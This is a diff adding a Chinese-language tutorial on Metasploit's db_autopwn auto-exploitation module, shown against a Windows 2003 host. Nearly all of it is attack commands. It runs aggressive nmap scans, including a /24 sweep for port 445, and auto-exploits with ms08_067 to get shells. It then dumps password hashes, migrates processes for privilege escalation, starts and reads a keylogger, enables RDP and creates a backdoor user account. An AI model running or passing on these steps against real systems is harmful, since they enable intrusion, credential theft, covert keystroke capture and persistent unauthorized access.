@@ -1,0 +1,65 @@
+db_autopwn 自动攻击模块
+
+#> msfconsole
+
+MSF > load db_autopwn
+
+首先用db_nmap扫描目标机.
+目标主机:win2003 192.168.1.108
+命令:
+db_nmap -T aggressive -v -n -sV -O xxx.xxx.xxx.xx
+简单解释下:
+-T aggressive 用最快扫描方式
+-v 显示结果
+-n 应该是不解析DNS吧。
+-sV 扫服务
+-O 扫系统
+详细大家可以看help
+扫描后db_nmap会将结果保存到services .
+这里要等下，
+?Nmap: Scanning 192.168.1.108 [1000 ports]
+?Nmap: Discovered open port 3389/tcp on 192.168.1.108
+?Nmap: Discovered open port 139/tcp on 192.168.1.108
+?Nmap: Discovered open port 1025/tcp on 192.168.1.108
+?Nmap: Discovered open port 445/tcp on 192.168.1.108
+?Nmap: Discovered open port 135/tcp on 192.168.1.108
+?Nmap: Discovered open port 1026/tcp on 192.168.1.108
+结果~
+
+我们进入servies看下
+
+好，这里就利用db_autopwn开始自动攻击
+
+MSF > db_autopwn -p -R great -e -q 192.168.56.101 
+
+解释下命令：-p 通过端口入侵 -t 用所有的入侵模块尝试入侵 -e 开始入侵
+好了~已经搞定结果了~
+
+OK.结果已经出来了。有两个可以利用的。
+sessions -i 1 进入msf
+我这里已经进入了。
+讲一点基本的操作
+
+sysinfo 查看系统信息
+getuid 系统权限 
+run hashdump 这是读取用户hash值的 可以用工具暴力破解
+ps
+migrate uid 如果不是系统权限，可以用这个提权。（先PS下，看下哪个是系统权限运行的，然后注入进去）
+keyscan_start 键盘纪录工具
+keyscan_dump 读取键盘纪录
+keyscan_stop
+run getgui -e 运行3389终端
+run getgui -u xxx -p xxx 创建用户名及密码
+rdesktop xxx.xx.xx.xx:xxx 连接上去
+
+msf > db_nmap -sS -PS445 -p445 -n -T Aggressive AAA.BBB.CCC.0/24   
+
+最后，我们执行db_autopwn命令，使用-e选项指定exploit，-p选项指定基于端口的匹配，-b选项来选择binderhell有效内容，而-m选项只能使用字符串运行模块 他们的名字叫“ms08_067”
+
+msf > db_autopwn -e -p -b -m ms08_067      
+
+msf > sessions -l   
+
+msf > sessions -i 1   
+
+ps:甚至可以指定选用更多的漏洞插件,比如db_autopwn -e -p -b -m windows，这样是检测所有windows漏洞插件，但是不推荐这样，扫描量会比较大，而且也容易出现问题（比如一台主机多个shell，shell容易死掉），如果实在扫不出任何漏洞才考虑使用这种方式。  
